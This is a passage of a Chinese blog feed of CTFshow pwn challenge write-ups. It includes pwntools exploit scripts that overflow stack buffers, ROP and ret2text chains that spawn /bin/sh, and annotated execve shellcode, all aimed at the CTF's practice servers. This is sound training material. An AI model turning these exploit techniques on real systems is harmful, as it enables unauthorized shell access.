data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn54'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28230</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>rbx_ret<span class=\"token operator\">=</span><span class=\"token number\">0x0804859b</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>ret<span class=\"token operator\">=</span><span class=\"token number\">0x080483aa</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag_func1<span class=\"token operator\">=</span><span class=\"token number\">0x8048586</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>flag_func2<span class=\"token operator\">=</span><span class=\"token number\">0x804859D</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token number\">0x08048606</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input your flag: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#payload1=b\"a\"*(0x2c+4)+p32(flag_func1)+p32(flag_func2)+p32(flag)+p32(0)+p32(0xacacacac)+p32(0xbdbdbdbd)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#payload1=b\"a\"*(0x2c+4)+p32(ret)+p32(flag_func1)+p32(rbx_ret)+p32(0xacacacac)+p32(flag_func2)+p32(rbx_ret)+p32(0xbdbdbdbd)+p32(flag)#+p32(0)#+p32(0xacacacac)+p32(0xbdbdbdbd)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x2c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>rbx_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xacacacac</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>rbx_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xbdbdbdbd</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#+p32(flag)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#payload1=b\"a\"*(0x2c+4)+p32(flag_func1)+p32(flag_func2)+p32(flag)+p32(0xacacacac)+p32(0xbdbdbdbd)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn56\"><a class=\"anchor\" href=\"#pwn56\">#</a> pwn56</h1>\n<h2 id=\"题目-10\"><a class=\"anchor\" href=\"#题目-10\">#</a> 题目：</h2>\n<p>题目内容：</p>\n<p>题目描述： <code>先了解一下简单的32位shellcode吧</code></p>\n<pre><code>.text:08048060\n.text:08048060                 public start\n.text:08048060 start           proc near               ; DATA XREF: LOAD:08048018↑o\n.text:08048060                 push    68h ; 'h'\n.text:08048062                 push    732F2F2Fh\n.text:08048067                 push    6E69622Fh\n.text:0804806C                 mov     ebx, esp        ; file\n.text:0804806E                 xor     ecx, ecx        ; argv\n.text:08048070                 xor     edx, edx        ; envp\n.text:08048072                 push    0Bh\n.text:08048074                 pop     eax\n.text:08048075                 int     80h             ; LINUX - sys_execve\n.text:08048075 start           endp\n.text:08048075\n.text:08048075 _text           ends\n.text:08048075\n\n</code></pre>\n<p>对应伪代码：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __noreturn <span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> v1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp-Ch] [ebp-Ch] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin///sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v0 <span class=\"token operator\">=</span> <span class=\"token function\">sys_execve</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里发现是通过系统调用来 <code>getshell</code> ，32 位系统调用，0xb (11) 号的系统调用是 <code>execve</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">__NR_execve</span> <span class=\"token expression\"><span class=\"token number\">11</span></span></span></pre></td></tr></table></figure><pre><code class=\"language-asm\">push    68h ; #0x68(&quot;h&quot;)\npush    732F2F2Fh# 0x73(&quot;s&quot;) 0x2F(&quot;/&quot;) 0x2F(&quot;/&quot;) 0x2F(&quot;/&quot;)\npush    6E69622Fh# 0x6E(&quot;n&quot;) 0x69(&quot;i&quot;) 0x62(&quot;b&quot;) 0x2F(&quot;/&quot;) \n\n\nmov     ebx, esp        ; file  # 将栈顶的“/bin/sh”放入ebx\nxor     ecx, ecx        ; argv   #ecx清零\nxor     edx, edx        ; envp  #edx清零\npush    0Bh\npop     eax\nint     80h             ; LINUX - sys_execve\n\n</code></pre>\n<p>这里最后执行 <code>execve(&quot;/bin/sh&quot;,0,0)</code></p>\n<p>32 位传参系统调用号放入 eax，参数分别放入 ebx，ecx，edx</p>\n<p>所以这个程序执行直接就 getshell 了</p>\n<h1 id=\"pwn57\"><a class=\"anchor\" href=\"#pwn57\">#</a> pwn57</h1>\n<h2 id=\"题目-11\"><a class=\"anchor\" href=\"#题目-11\">#</a> 题目：</h2>\n<p>题目描述： <code>先了解一下简单的64位shellcode吧</code></p>\n<pre><code>0000000000400080 ; Attributes: noreturn\n.text:0000000000400080\n.text:0000000000400080                 public _start\n.text:0000000000400080 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o\n.text:0000000000400080                 push    rax\n.text:0000000000400081                 xor     rdx, rdx\n.text:0000000000400084                 xor     rsi, rsi\n.text:0000000000400087                 mov     rbx, 68732F2F6E69622Fh\n.text:0000000000400091                 push    rbx\n.text:0000000000400092                 push    rsp\n.text:0000000000400093                 pop     rdi\n.text:0000000000400094                 mov     al, 3Bh ; ';'\n.text:0000000000400096                 syscall                 ; LINUX -\n.text:0000000000400096 _start          endp\n.text:0000000000400096\n.text:0000000000400096 _text           ends\n\n</code></pre>\n<pre><code class=\"language-ams\">push    rax\nxor     rdx, rdx\nxor     rsi, rsi\nmov     rbx, 68732F2F6E69622Fh  #/bin//sh\npush    rbx #将“/bin/sh”放入rbx，这里push将rsp地址的值为'/bin/sh'\npush    rsp #rsp-8\npop     rdi  #将栈顶的指向的地址内的&quot;/bin/sh&quot;放入rdi\nmov     al, 3Bh ; ';' #系统调用号59放入rax（al）\nsyscall                 ; LINUX -\n\n</code></pre>\n<p>系统调用 0x3B (59)</p>\n<pre><code>#define __NR_execve 59 \n</code></pre>\n<p>64 位传参方式：将系统调用号存入 rax 寄存器中，然后从左到右依次将参数传入 rdi、rsi、rdx 寄存器中</p>\n<p>这里直接调用了 <code>execve(&quot;/bin/sh&quot;,0,0)</code> ，执行程序即可 <code>getshell</code></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/",
            "url": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/",
            "title": "CTFshow(Test_your_nc部分,0~4)",
            "date_published": "2023-09-15T03:01:15.000Z",
            "content_html": "<h1 id=\"pwn0\"><a class=\"anchor\" href=\"#pwn0\">#</a> pwn0</h1>\n<h2 id=\"题目\"><a class=\"anchor\" href=\"#题目\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWt1sS.png\" alt=\"\" /></p>\n<p>利用 ssh 连接，不知道为什么之前连接是失败的<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWffpV.png\" alt=\"\" /></p>\n<p>然后输入密码会加载一大堆东西</p>\n<p>而且密码不在当前目录下需要到根目录查看</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWfLfx.png\" alt=\"\" /></p>\n<h1 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h1>\n<h2 id=\"题目-2\"><a class=\"anchor\" href=\"#题目-2\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWhgDe.md.png\" alt=\"\" /></p>\n<p>题目里已经说明有后门了，下载附件利用 ida 打开</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWhqbQ.png\" alt=\"\" /></p>\n<p>发现输出完句子之后会直接执行 cat flag，那么直接 nc 连接即可<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWhXUs.md.png\" alt=\"\" /></p>\n<h1 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h1>\n<h2 id=\"题目-3\"><a class=\"anchor\" href=\"#题目-3\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPW4pvT.png\" alt=\"\" /></p>\n<p>下载附件查看程序信息，发现是 64 位程序<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPW4WsU.md.png\" alt=\"\" /></p>\n<p>ida 打开<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWL4e0.png\" alt=\"\" /><br />\n发现有个 system (/bin/sh), 直接 给权限了，那么就直接可以获取 flag</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWL7YF.png\" alt=\"\" /></p>\n<h1 id=\"pwn3\"><a class=\"anchor\" href=\"#pwn3\">#</a> pwn3</h1>\n<h2 id=\"题目-4\"><a class=\"anchor\" href=\"#题目-4\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWLLl9.png\" alt=\"\" /></p>\n<p>查看保护是 64 位程序，ida 打开<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWLzTK.png\" alt=\"\" /></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOCfe.png\" alt=\"\" /></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOFld.png\" alt=\"\" /></p>\n<p>这里考察我们对函数的理解</p>\n<ul>\n<li>put 函数输出的是字符串</li>\n<li>echo 主要用于打印简单的字符串和变量值</li>\n<li>cat 用来查看文件内容，更侧重于处理文件，实现文件内容的读取和拼接等操作</li>\n</ul>\n<p>(只有 system (cat /flag) 输出了 flag，选择 4 只会输出字符串”/ctfshow_flag“)<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOllj.png\" alt=\"\" /></p>\n<h1 id=\"pwn4\"><a class=\"anchor\" href=\"#pwn4\">#</a> pwn4</h1>\n<h2 id=\"题目-5\"><a class=\"anchor\" href=\"#题目-5\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOonI.png\" alt=\"\" /></p>\n<p>查看程序是 64 位，用 ida 打开<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfDMex.png\" alt=\"\" /></p>\n<p><code>execve_func()</code>  里有后门<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfDlTK.md.png\" alt=\"\" /></p>\n<p><code>strcmp(str1,str2)</code>  该函数会进行比较，str1=str2 时会返回 0，所以输入 <code>CTFshowPWN</code>  以此绕过判断<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfDPe0.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn",
                "nc"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow35-46/",
            "url": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow35-46/",
            "title": "CTFshow(栈溢出部分,35~46)",
            "date_published": "2023-09-15T03:01:15.000Z",
            "content_html": "<h1 id=\"pwn35\"><a class=\"anchor\" href=\"#pwn35\">#</a> pwn35</h1>\n<h2 id=\"题目\"><a class=\"anchor\" href=\"#题目\">#</a> 题目：</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/11/piS9x54.png\" alt=\"\" /><br />\n32 位程序，只开启了部分 RELRO</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/11/piSCQMt.png\" alt=\"\" /></p>\n<p>发现又是这个信号处理机制，出现溢出错误使便会打印出 <code>flag</code></p>\n<p><code>dest</code>  数组为 104 个，输入 105 个字符即可溢出</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/11/piSC1qf.png\" alt=\"\" /></p>\n<h1 id=\"pwn36\"><a class=\"anchor\" href=\"#pwn36\">#</a> pwn36</h1>\n<h2 id=\"题目-2\"><a class=\"anchor\" href=\"#题目-2\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/11/piSCJIg.png\" alt=\"\" /></p>\n<p>32 位程序，只开启了部分 RELRO</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/11/piSCsdU.png\" alt=\"\" /></p>\n<p>直接利用 <code>gets</code>  溢出返回到 <code>后门函数</code> 即可</p>\n<pre><code class=\"language-pyhton\">from pwn import *\nfrom LibcSearcher import *\ncontext(os='linux', arch='amd64', log_level='debug')\n#p=remote('node4.buuoj.cn',28249)\np=remote(&quot;pwn.challenge.ctf.show&quot;,28178)\nflag=0x08048586\np.recvuntil(&quot;want: &quot;)\npayload1=b&quot;a&quot;*(0x28+4)+p32(flag)#+p32()+p32()+p32()+p32()\np.sendline(payload1)\np.recv()\np.interactive()\n\n</code></pre>\n<h1 id=\"pwn37\"><a class=\"anchor\" href=\"#pwn37\">#</a> pwn37</h1>\n<h2 id=\"题目-3\"><a class=\"anchor\" href=\"#题目-3\">#</a> 题目：</h2>\n<p>题目提示 <code>“32位的 system(“/bin/sh”) 后门函数给你”</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/11/piSPQfJ.png\" alt=\"\" /></p>\n<p>直接利用 <code>read</code>  溢出返回到 <code>后门函数</code> 即可 <code>getshell</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28242</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token number\">0x008048521</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"ret2text&amp;&amp;32bit\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x12</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token comment\">#+p32()+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn3864位堆栈平衡\"><a class=\"anchor\" href=\"#pwn3864位堆栈平衡\">#</a> pwn38（64 位堆栈平衡）</h1>\n<h2 id=\"题目-4\"><a class=\"anchor\" href=\"#题目-4\">#</a> 题目：</h2>\n<p>题目说明 <code>“64位的 system(“/bin/sh”) 后门函数给你”</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/11/piSPD1A.png\" alt=\"\" /></p>\n<p>64 位程序，改成 8 字节大小即可，但是这里要考虑 <code>堆栈平衡</code> 所以需要再加一个 <code>ret地址</code> 来保存平衡</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28279</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token number\">0x0400657</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>ret<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400287</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"easy ret2text&amp;&amp;64bit\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token comment\">#+p32()+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn3932位系统传参\"><a class=\"anchor\" href=\"#pwn3932位系统传参\">#</a> pwn39（32 位系统传参）</h1>\n<p>32 位传参 (先函数，再返回地址，然后是参数)：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span>padding<span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system的返回地址<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system的参数<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"题目-5\"><a class=\"anchor\" href=\"#题目-5\">#</a> 题目</h2>\n<p>题目说明  <code>32位的 system(); &quot;/bin/sh&quot;</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/12/piSrRyD.png\" alt=\"\" /></p>\n<p>这里调用的 <code>system</code>  需要 <code>/bin/sh</code>  当作参数，而系统里有，所以就可以直接用 <code>32位传参</code> 的方法来 <code>getshell</code></p>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28163</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ret<span class=\"token operator\">=</span><span class=\"token number\">0x08048356</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>system<span class=\"token operator\">=</span><span class=\"token number\">0x080483A0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>binsh<span class=\"token operator\">=</span><span class=\"token number\">0x8048750</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"ret2text&amp;&amp;32bit\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x12</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn40-64位系统传参\"><a class=\"anchor\" href=\"#pwn40-64位系统传参\">#</a> pwn40 (64 位系统传参)</h1>\n<p>64 位传参：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span>padding<span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#64 传参需要利用寄存器</span></pre></td></tr></table></figure><h2 id=\"题目-6\"><a class=\"anchor\" href=\"#题目-6\">#</a> 题目：</h2>\n<p>题目描述:  <code> 64位的 system(); &quot;/bin/sh&quot;</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/12/piSyPUA.png\" alt=\"\" /></p>\n<p>exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token 